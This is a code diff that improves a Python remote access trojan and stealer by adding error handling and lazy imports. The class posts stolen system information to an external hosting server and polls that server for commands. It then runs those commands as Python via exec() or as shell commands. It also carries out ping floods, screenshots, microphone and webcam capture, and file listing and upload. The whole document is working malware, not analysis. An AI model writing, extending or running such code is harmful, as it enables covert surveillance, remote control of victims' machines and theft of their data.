@@ -21,15 +21,8 @@ import time  # Module for working with time.
 import threading  # Module for working with threading.
 import subprocess  # Module for working with console.
 import re  # Module for working with regular expressions
-import ctypes  # Module for working with message boxes.
 import shutil  # Module for working with files.
 import json  # Module for working with JSON.
-
-# Other Modules.
-import PIL.ImageGrab  # Module for working with screenshots.
-import pyaudio  # Module for working with audio.
-import wave  # Module for working with audio.
-import cv2  # Module for taking images from an webcam.
 
 
 class Trojan:
@@ -58,7 +51,7 @@ class Trojan:
         # Write there all URLs which will be used for sending
         # Trojan data, and RAT access.
         self.__server_urls = [
-            # Local server (Favorite server)>
+            # Local server (Favorite server).
             "http://127.0.0.1",
             # Main server:
             "https://nomistic-curve.000webhostapp.com"
@@ -107,6 +100,7 @@ class Trojan:
             "stealed_microphone": self.__setting_cache_folder + "\\Audio\\recording.wav",
             "stealed_webcam": self.__setting_cache_folder + "\\Image\\Image.png",
         }
+
         # Running trojan.
         self.run()
 
@@ -315,17 +309,27 @@ class Trojan:
         self.check_server_urls()
 
         # Sending.
-        with open(self.__files_paths["stealed_information"], 'rb') as file:
-            # With opened file.
+        try:
+            with open(self.__files_paths["stealed_information"], 'rb') as file:
+                # With opened file.
 
-            # Making an request.
-            request = requests.post(self.__server_url + self.__server_script_stealed_information_file,
-                                    files={'log.json': file},
-                                    params={
-                                        "sync_uri": self.__server_unique_request_index
-                                    }
-                                    )
-        self.show_debug_message("Sent information on the server!")
+                # Making an request.
+                request = requests.post(self.__server_url + self.__server_script_stealed_information_file,
+                                        files={'log.json': file},
+                                        params={
+                                            "sync_uri": self.__server_unique_request_index
+                                        }
+                                        )
+
+                if request.status_code != 200:
+                    # If request error.
+                    return self.show_debug_message("Error when syncing stealer information with an server.")
+            self.show_debug_message("Sent information on the server!")
+        except (FileExistsError, FileNotFoundError, IsADirectoryError, NotADirectoryError):
+            # If there an exception.
+
+            # Showing debug message.
+            self.show_debug_message("Not sent information on the server, file error occurred!")
 
     def stealer_create_log(self) -> None:
         """
@@ -340,9 +344,18 @@ class Trojan:
         self.path_validate(filename)
 
         # Opening file.
-        with open(filename, "w") as file:
-            # Writing JSON data.
-            json.dump(self.__stealed_information, file, indent=4)
+        try:
+            with open(filename, "w") as file:
+                # Writing JSON data.
+                json.dump(self.__stealed_information, file, indent=4)
+
+            # Showing debug message.
+            self.show_debug_message("Created log file in cache directory.")
+        except (FileExistsError, NotADirectoryError, FileNotFoundError, UnicodeDecodeError):
+            # If exception.
+
+            # Showing debug message.
+            self.show_debug_message("Not create log file, as there was new exception.")
 
     def remote_access_launch(self) -> None:
         """
@@ -367,6 +380,7 @@ class Trojan:
 
         # Showing debug message.
         self.show_debug_message("Started remote access thread!")
+
         while True:
             # Infinity loop.
 
@@ -390,10 +404,11 @@ class Trojan:
                                             f" Exception: {str(error)}, "
                                             f"Head: {command[0]}, "
                                             f"Command: {command[1]}")
+
             # Sleeping for some second.
             time.sleep(self.__setting_sync_remote_access_wait_time)
 
-    def remote_access_execute_command(self, command: list) -> None:
+    def remote_access_execute_command(self, command: list) -> str:
         """
         Executes command from remote server.
         :return: [None] Not return any.
@@ -409,9 +424,13 @@ class Trojan:
             # If it is python command.
 
             # Running python command.
-            exec(command_body, globals(), locals())
+            try:
+                exec(command_body, globals(), locals())
+            except Exception as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
 
-            # Trying get result.
+            # Trying to get result.
             try:
                 command_result = X  # noqa
             except NameError:
@@ -420,73 +439,126 @@ class Trojan:
         elif command_head == "CONSOLE":
             # If it is console command.
 
-            # Getting console process.
-            console_process = subprocess.Popen(command_body, shell=True,
-                                               stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=None)
+            try:
+                # Getting console process.
+                console_process = subprocess.Popen(command_body, shell=True,
+                                                   stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=None)
 
-            # Output.
-            command_output = console_process.communicate()
+                # Output.
+                command_output = console_process.communicate()
 
-            # Getting command result.
-            command_result = str(command_output[0].decode('utf-8').rstrip('\r|\n'))
-            command_result = command_result.replace("\n", "").replace("\r", "").replace("\t", "")
-            command_result = command_result.replace("\n", "").replace("\r", "")
-            command_result = re.sub("\s{4,}", " ", command_result)  # noqa
+                # Getting command result.
+                command_result = str(command_output[0].decode('utf-8').rstrip('\r|\n'))
+                command_result = command_result.replace("\n", "").replace("\r", "").replace("\t", "")
+                command_result = command_result.replace("\n", "").replace("\r", "")
+                command_result = re.sub("\s{4,}", " ", command_result)  # noqa
+            except Exception as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
         # If command is make DDOS.
         elif command_head == "DDOS":
             # DDOS Command.
 
             # Syntax: ["DDOS", "127.0.0.1|100"]
 
-            arguments = command_body.split("|")
-            os.system(f"ping -c {arguments[1]} {arguments[0]}")
+            try:
+                arguments = command_body.split("|")
+                os.system(f"ping -c {arguments[1]} {arguments[0]}")
+            except (Exception) as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
         # If command is execute system.
         elif command_head == "SYSTEM":
             # System Command.
 
-            # Result.
-            command_result = os.system(command_body)
+            try:
+                # Result.
+                command_result = os.system(command_body)
+            except Exception as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
         # If command is take screenshot.
         elif command_head == "SCREENSHOT":
             # Screenshot command.
 
-            # Taking screenshot.
-            screenshot = PIL.ImageGrab.grab()
-            screenshot.show()
+            try:
+                import PIL.ImageGrab  # Module for working with screenshots.
+            except ImportError:
+                # If we don't have this module.
+                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"
+
+            try:
+                # Taking screenshot.
+                screenshot = PIL.ImageGrab.grab()
+                screenshot.show()
+            except Exception as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
         # If command is record microphone.
         elif command_head == "MICROPHONE":
             # Recording.
 
-            # Arguments.
-            arguments = command_body.split("|")
+            try:
+                import pyaudio  # Module for working with audio.
+                import wave  # Module for working with audio.
+            except ImportError:
+                # If we don't have this module.
+                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"
 
-            # Recording..
-            self.record_microphone(arguments[0])
+            try:
+                # Arguments.
+                arguments = command_body.split("|")
+
+                # Recording.
+                self.record_microphone(arguments[0])
+            except Exception as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
         # If command is show message.
         elif command_head == "MESSAGE":
             # Showing message.
 
-            # Arguments.
-            arguments = command_body.split("|")
+            try:
+                import ctypes  # Module for working with message boxes.
+            except ImportError:
+                # If we don't have this module.
+                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"
 
-            # Showing message.
-            ctypes.windll.user32.MessageBoxW(0, arguments[1], arguments[0], arguments[2])
+            try:
+                # Arguments.
+                arguments = command_body.split("|")
+
+                # Showing message.
+                ctypes.windll.user32.MessageBoxW(0, arguments[1], arguments[0], arguments[2])
+            except Exception as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
         # If command is record webcam.
         elif command_head == "WEBCAM":
             # Reading camera.
 
-            # Getting image.
-            cam = cv2.VideoCapture(0)
-            ret_val, img = cam.read()
+            try:
+                import cv2  # Module for taking images from an webcam.
+            except ImportError:
+                # If we don't have this module.
+                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"
 
-            # Getting filename.
-            filename = self.__files_paths["stealed_webcam"]
+            try:
+                # Getting image.
+                cam = cv2.VideoCapture(0)
+                ret_val, img = cam.read()
 
-            # Validating path.
-            self.path_validate(filename)
+                # Getting filename.
+                filename = self.__files_paths["stealed_webcam"]
 
-            # Writing to the ile.
-            cv2.imwrite(filename, img)
+                # Validating path.
+                self.path_validate(filename)
+
+                # Writing to the ile.
+                cv2.imwrite(filename, img)
+            except Exception as error:  # noqa
+                # If exception - show this.
+                command_result = str(error)
         # If command is get files in directory.
         elif command_head == "FILES":
             # Getting files.
@@ -510,7 +582,9 @@ class Trojan:
         # If command is upload file.
         elif command_head == "UPLOAD":
             # Uploading file.
-            pass
+
+            # Returning file path for syncing file later with server.
+            command_result = command_body
 
         # Returning result.
         return command_result
@@ -545,6 +619,7 @@ class Trojan:
 
             # Getting commands.
             synced_commands = response
+
         # Returning synced commands.
         return synced_commands
 
@@ -557,6 +632,13 @@ class Trojan:
         :param seconds: [int] Amount of the seconds to record.
         :return: [none] Not returns any.
         """
+
+        try:
+            import pyaudio  # Module for working with audio.
+            import wave  # Module for working with audio.
+        except ImportError:
+            # If we don't have this module.
+            return
 
         # Record settings.
 
@@ -669,7 +751,7 @@ class Trojan:
     @staticmethod
     def get_ip() -> dict:
         """
-        Gets client IP adress and location.
+        Gets client IP address and location.
         :return: [dict] Dict where holds IP and location..
         """
 
